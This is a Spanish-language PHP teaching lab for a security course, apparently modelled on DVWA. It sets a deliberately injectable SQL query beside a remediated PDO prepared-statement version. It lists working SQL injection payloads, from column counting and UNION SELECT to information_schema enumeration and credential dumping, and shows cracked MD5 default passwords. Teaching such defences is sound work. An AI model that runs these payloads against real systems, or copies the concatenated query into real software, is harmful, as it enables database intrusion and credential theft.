<?php
// ============================================================
// LABORATORIO 2 – INYECCIÓN SQL (SQLi) MANUAL Y DEFENSAS
// GSR600 – Seguridad Informática
// Archivo: sqli.php
// Práctica 6.3: Ataque SQL Manual y Remediación con PDO
// ============================================================

require_once 'conexion.php';

$id_input = $_GET['id'] ?? '';
$modo = $_GET['modo'] ?? 'vulnerable'; // 'vulnerable' o 'seguro'
$resultados = [];
$error_sql = '';
$query_ejecutada = '';
$tiempo_ms = 0;

if (isset($_GET['id'])) {
    $t0 = microtime(true);

    if ($modo === 'vulnerable') {
        // ========================================================
        // 1. MODO VULNERABLE (Simulación idéntica a DVWA Low)
        // La variable $id_input se concatena directamente sin sanear.
        // Esto permite que comillas (') y sentencias UNION alteren la consulta.
        // ========================================================
        $query_ejecutada = "SELECT first_name, last_name FROM users WHERE user_id = '$id_input';";

        try {
            $stmt = $pdo->query($query_ejecutada);
            if ($stmt) {
                $resultados = $stmt->fetchAll();
            }
        } catch (PDOException $e) {
            // Se expone el error de la base de datos deliberadamente,
            // tal como describe la Gráfica 21 y 22 del informe.
            $error_sql = $e->getMessage();
        }

    } else {
        // ========================================================
        // 2. MODO SEGURO (Remediación mediante Prepared Statements + Tipo)
        // La consulta se precompila en el motor de la base de datos.
        // Se valida el tipo de dato y se enlaza como entero PDO::PARAM_INT.
        // ========================================================
        $clean_id = filter_var($id_input, FILTER_VALIDATE_INT);

        if ($clean_id === false) {
            $query_ejecutada = "SELECT first_name, last_name FROM users WHERE user_id = :id; [Entrada rechazada por validación de tipo]";
            $error_sql = "Defensa Activa (Type Validation): El valor ingresado contiene caracteres inválidos para un identificador numérico. La consulta fue detenida antes de alcanzar la base de datos.";
        } else {
            $query_ejecutada = "SELECT first_name, last_name FROM users WHERE user_id = :id; [Enlace seguro: :id = (int)$clean_id]";
            try {
                $stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id;");
                $stmt->bindValue(':id', $clean_id, PDO::PARAM_INT);
                $stmt->execute();
                $resultados = $stmt->fetchAll();
            } catch (PDOException $e) {
                error_log("Error seguro: " . $e->getMessage());
                $error_sql = "Ocurrió un error en la solicitud. (Detalles técnicos ocultos por seguridad).";
            }
        }
    }

    $tiempo_ms = round((microtime(true) - $t0) * 1000, 2);
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Práctica 6.3 - Inyección SQL Manual | Laboratorio 2</title>
    <!-- Bootstrap 5.3+ -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <style>
        body {
            background-color: #0b0f19;
            color: #f1f5f9;
            font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
            min-height: 100vh;
            padding: 30px 15px;
        }

        .main-container {
            max-width: 1150px;
            margin: 0 auto;
        }

        .card-custom {
            background: #111827;
            border: 1px solid #1f2937;
            border-radius: 12px;
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
            overflow: hidden;
            margin-bottom: 24px;
        }

        .card-header-custom {
            padding: 18px 24px;
            border-bottom: 1px solid #1f2937;
        }

        .form-control {
            background-color: #1f2937;
            border: 1px solid #374151;
            color: #f9fafb;
            padding: 10px 14px;
        }

        .form-control:focus {
            background-color: #1f2937;
            border-color: #ef4444;
            color: #fff;
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.25);
        }

        .query-box {
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            background: #030712;
            border: 1px solid #1f2937;
            padding: 12px 14px;
            border-radius: 8px;
            font-size: 0.82rem;
            color: #38bdf8;
            word-break: break-all;
        }

        .btn-payload {
            background: #1f2937;
            border: 1px solid #374151;
            color: #cbd5e1;
            font-size: 0.76rem;
            padding: 6px 10px;
            border-radius: 6px;
            text-align: left;
            width: 100%;
            margin-bottom: 6px;
            transition: all 0.15s;
        }
        .btn-payload:hover {
            background: #374151;
            color: #fff;
            border-color: #60a5fa;
        }

        .table-dark-custom {
            --bs-table-bg: #111827;
            --bs-table-border-color: #1f2937;
            font-size: 0.85rem;
        }
    </style>
</head>
<body>

<div class="main-container">

    <!-- Navegación Superior -->
    <div class="d-flex justify-content-between align-items-center mb-4 flex-wrap gap-2">
        <div>
            <span class="badge bg-danger mb-1"><i class="bi bi-radioactive me-1"></i> Laboratorio 2 &bull; GSR600</span>
            <h2 class="fw-bold m-0 text-white">6.3. PARTE PRÁCTICA: INYECCIÓN SQL MANUAL</h2>
            <small class="text-secondary">Simulación de auditoría de seguridad y análisis de defensas contra SQLi</small>
        </div>
        <div class="d-flex gap-2">
            <a href="index.php" class="btn btn-outline-secondary btn-sm"><i class="bi bi-house me-1"></i> Inicio</a>
            <a href="xss.php" class="btn btn-outline-warning btn-sm"><i class="bi bi-code-slash me-1"></i> Ir a Práctica XSS</a>
            <a href="fuerza_bruta.php" class="btn btn-outline-info btn-sm"><i class="bi bi-shield-lock me-1"></i> Fuerza Bruta</a>
        </div>
    </div>

    <!-- SELECTOR DE MODO DE SEGURIDAD -->
    <div class="card-custom mb-4" style="background: <?= $modo === 'vulnerable' ? 'rgba(220, 38, 38, 0.1)' : 'rgba(16, 185, 129, 0.1)' ?>; border-color: <?= $modo === 'vulnerable' ? '#dc2626' : '#10b981' ?>;">
        <div class="p-3 d-flex justify-content-between align-items-center flex-wrap gap-3">
            <div>
                <span class="badge <?= $modo === 'vulnerable' ? 'bg-danger' : 'bg-success' ?> mb-1">
                    <?= $modo === 'vulnerable' ? 'MODO VULNERABLE ACTIVO' : 'MODO DEFENSIVO (SEGURO) ACTIVO' ?>
                </span>
                <div class="small <?= $modo === 'vulnerable' ? 'text-danger-emphasis' : 'text-success-emphasis' ?>">
                    <?= $modo === 'vulnerable' 
                        ? 'La entrada del usuario se concatena directamente en la sentencia SQL sin sanear (permite inyecciones UNION).' 
                        : 'La consulta utiliza Sentencias Preparadas (PDO Prepared Statements), bloqueando cualquier intento de inyección.' ?>
                </div>
            </div>
            <div class="btn-group">
                <a href="sqli.php?modo=vulnerable<?= !empty($id_input) ? '&id=' . urlencode($id_input) : '' ?>" class="btn btn-sm <?= $modo === 'vulnerable' ? 'btn-danger' : 'btn-outline-danger' ?> fw-bold">
                    <i class="bi bi-unlock-fill me-1"></i> Modo Vulnerable
                </a>
                <a href="sqli.php?modo=seguro<?= !empty($id_input) ? '&id=' . urlencode($id_input) : '' ?>" class="btn btn-sm <?= $modo === 'seguro' ? 'btn-success' : 'btn-outline-success' ?> fw-bold">
                    <i class="bi bi-shield-fill-check me-1"></i> Modo Seguro (PDO)
                </a>
            </div>
        </div>
    </div>

    <div class="row g-4">
        <!-- COLUMNA IZQUIERDA: Formulario de Consulta e Inyección -->
        <div class="col-lg-6">
            <div class="card-custom">
                <div class="card-header-custom" style="background: linear-gradient(135deg, #1e293b, #0f172a);">
                    <h5 class="m-0 fw-bold text-white"><i class="bi bi-terminal text-info me-2"></i>Formulario de Consulta de Usuario</h5>
                    <small class="text-secondary">Simula el campo "User ID" de la plataforma DVWA</small>
                </div>
                <div class="p-4">
                    <form action="sqli.php" method="GET">
                        <input type="hidden" name="modo" value="<?= htmlspecialchars($modo) ?>">

                        <div class="mb-3">
                            <label for="id" class="form-label text-secondary fw-semibold">User ID:</label>
                            <div class="input-group">
                                <span class="input-group-text bg-dark border-secondary text-secondary"><i class="bi bi-search"></i></span>
                                <input type="text" class="form-control" id="id" name="id" required placeholder="Ej. 1 o sentencia SQL" value="<?= htmlspecialchars($id_input) ?>">
                                <button type="submit" class="btn <?= $modo === 'vulnerable' ? 'btn-danger' : 'btn-success' ?> fw-bold px-4">
                                    Enviar
                                </button>
                            </div>
                        </div>
                    </form>

                    <!-- VISOR DE CONSULTA SQL CRUDA -->
                    <?php if (!empty($query_ejecutada)): ?>
                        <div class="mt-4">
                            <small class="text-secondary d-block mb-1 fw-semibold">
                                <i class="bi bi-cpu me-1"></i> Consulta recibida por el motor MySQL (<?= $tiempo_ms ?> ms):
                            </small>
                            <div class="query-box"><?= htmlspecialchars($query_ejecutada) ?></div>
                        </div>
                    <?php endif; ?>

                    <!-- MENSAJE DE ERROR MYSQL (Gráfica 21 y 22) -->
                    <?php if (!empty($error_sql)): ?>
                        <div class="mt-4 p-3 rounded-3" style="background:#450a0a; border: 1px solid #dc2626;">
                            <div class="text-danger fw-bold small mb-1">
                                <i class="bi bi-bug-fill me-1"></i> Error en el motor de la base de datos (Revelación de información):
                            </div>
                            <code class="text-warning small d-block"><?= htmlspecialchars($error_sql) ?></code>
                            <small class="text-secondary d-block mt-2" style="font-size:0.75rem;">
                                Como indica la guía: <em>"La aplicación muestra mensaje de error que se produce en el motor... eso le proporciona al atacante una forma de conseguir enumerar la estructura de las tablas"</em>.
                            </small>
                        </div>
                    <?php endif; ?>

                    <!-- TABLA DE RESULTADOS DEVUELTOS -->
                    <?php if (!empty($resultados)): ?>
                        <div class="mt-4">
                            <h6 class="fw-bold text-success mb-2"><i class="bi bi-check2-circle me-1"></i> Registros Obtenidos (<?= count($resultados) ?>):</h6>
                            <div class="table-responsive">
                                <table class="table table-dark table-striped table-bordered table-dark-custom align-middle">
                                    <thead>
                                        <tr>
                                            <th>Columna 1 (first_name)</th>
                                            <th>Columna 2 (last_name)</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php foreach ($resultados as $row): ?>
                                            <tr>
                                                <td><span class="badge bg-secondary"><?= htmlspecialchars($row['first_name'] ?? 'NULL') ?></span></td>
                                                <td><code style="color:#38bdf8;"><?= htmlspecialchars($row['last_name'] ?? 'NULL') ?></code></td>
                                            </tr>
                                        <?php endforeach; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    <?php elseif (isset($_GET['id']) && empty($error_sql)): ?>
                        <div class="alert alert-secondary small mt-4 mb-0" role="alert">
                            <i class="bi bi-info-circle me-1"></i> La consulta se ejecutó pero no devolvió registros coincidentes.
                        </div>
                    <?php endif; ?>

                </div>
            </div>
        </div>

        <!-- COLUMNA DERECHA: Vector de Pruebas del Licenciado (Paso a Paso) -->
        <div class="col-lg-6">
            <div class="card-custom">
                <div class="card-header-custom" style="background: linear-gradient(135deg, #1e293b, #0f172a);">
                    <h5 class="m-0 fw-bold text-white"><i class="bi bi-list-check text-warning me-2"></i>Vectores de Prueba de la Guía Oficial</h5>
                    <small class="text-secondary">Haz clic en cada botón para cargar los pasos exactos del Licenciado</small>
                </div>
                <div class="p-3">

                    <small class="text-muted fw-bold d-block mb-1">FASE 1: DETECCIÓN Y CONTEO DE COLUMNAS (Gráficas 21 y 22)</small>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1')">
                        <strong>1. Consulta Normal:</strong> <code>1</code> <span class="text-muted">(Devuelve datos del usuario admin)</span>
                    </button>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\'')">
                        <strong>2. Provocar Error de Sintaxis:</strong> <code>1'</code> <span class="text-danger">(Comprueba si es vulnerable)</span>
                    </button>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=1 order by 1#')">
                        <strong>3. Ordenar por Columna 1:</strong> <code>1' and 1=1 order by 1#</code> <span class="text-success">(Éxito)</span>
                    </button>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=1 order by 2#')">
                        <strong>4. Ordenar por Columna 2:</strong> <code>1' and 1=1 order by 2#</code> <span class="text-success">(Éxito)</span>
                    </button>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=1 order by 3#')">
                        <strong>5. Ordenar por Columna 3:</strong> <code>1' and 1=1 order by 3#</code> <span class="text-danger">(Error -> Existen 2 columnas)</span>
                    </button>

                    <small class="text-muted fw-bold d-block mt-3 mb-1">FASE 2: EXTRACCIÓN CON UNION SELECT (Gráficas 23, 24 y 25)</small>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=1 union select 1,2 #')">
                        <strong>6. Unión de 2 Columnas:</strong> <code>1' and 1=1 union select 1,2 #</code>
                    </button>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=0 union select null,@@version #')">
                        <strong>7. Obtener Versión MySQL:</strong> <code>1' and 1=0 union select null,@@version #</code>
                    </button>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=0 union select @@version,database() #')">
                        <strong>8. Versión y Nombre de BD:</strong> <code>1' and 1=0 union select @@version,database() #</code>
                    </button>

                    <small class="text-muted fw-bold d-block mt-3 mb-1">FASE 3: ENUMERACIÓN Y EXFILTRACIÓN (Gráficas 26 y 27)</small>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=0 union select table_schema, table_name from information_schema.tables where table_schema=database() #')">
                        <strong class="text-info">9.1. Listar Tablas (Fila por fila):</strong> <code>1' and 1=0 union select table_schema, table_name from information_schema.tables where table_schema=database() #</code>
                    </button>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=0 union select null, group_concat(table_name) from information_schema.tables where table_schema=database() #')">
                        <strong>9.2. Enumerar Tablas (Una sola línea):</strong> <code>... group_concat(table_name) from information_schema.tables ...</code>
                    </button>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=0 union select null, group_concat(column_name) from information_schema.columns where table_name=\'users\' #')">
                        <strong>10. Columnas de 'users':</strong> <code>... group_concat(column_name) from information_schema.columns ...</code>
                    </button>
                    <button type="button" class="btn-payload" onclick="cargarPayload('1\' and 1=0 union select null, group_concat(user,0x3a,password) from users #')">
                        <strong class="text-warning">11. EXFILTRAR USUARIOS Y PASSWORDS:</strong> <code>... group_concat(user,0x3a,password) from users #</code>
                    </button>

                </div>
            </div>

            <!-- TABLA DE CONTRASEÑAS CRACKEADAS (Gráficas 28, 29 y 30) -->
            <div class="card-custom">
                <div class="card-header-custom d-flex justify-content-between align-items-center">
                    <h6 class="m-0 fw-bold text-white"><i class="bi bi-key-fill text-success me-2"></i>Contraseñas Descifradas de la Guía</h6>
                    <span class="badge bg-success">Hash MD5 Revertido</span>
                </div>
                <div class="p-3">
                    <div class="table-responsive">
                        <table class="table table-dark table-sm table-bordered align-middle" style="font-size:0.75rem;">
                            <thead>
                                <tr>
                                    <th>Usuario</th>
                                    <th>Hash MD5 Extraído</th>
                                    <th>Clave Descifrada</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr><td>admin</td><td><code>5f4dcc3b5aa765d61d8327deb882cf99</code></td><td><span class="badge bg-warning text-dark">password</span></td></tr>
                                <tr><td>gordonb</td><td><code>e99a18c428cb38d5f260853678922e03</code></td><td><span class="badge bg-warning text-dark">abc123</span></td></tr>
                                <tr><td>1337</td><td><code>8d3533d75ae2c3966d7e0d4fcc69216b</code></td><td><span class="badge bg-warning text-dark">charley</span></td></tr>
                                <tr><td>pablo</td><td><code>0d107d09f5bbe40cade3de5c71e9e9b7</code></td><td><span class="badge bg-warning text-dark">letmein</span></td></tr>
                                <tr><td>smithy</td><td><code>5f4dcc3b5aa765d61d8327deb882cf99</code></td><td><span class="badge bg-warning text-dark">password</span></td></tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

        </div>
    </div>

</div>

<script>
function cargarPayload(p) {
    document.getElementById('id').value = p;
}
</script>

</body>
</html>
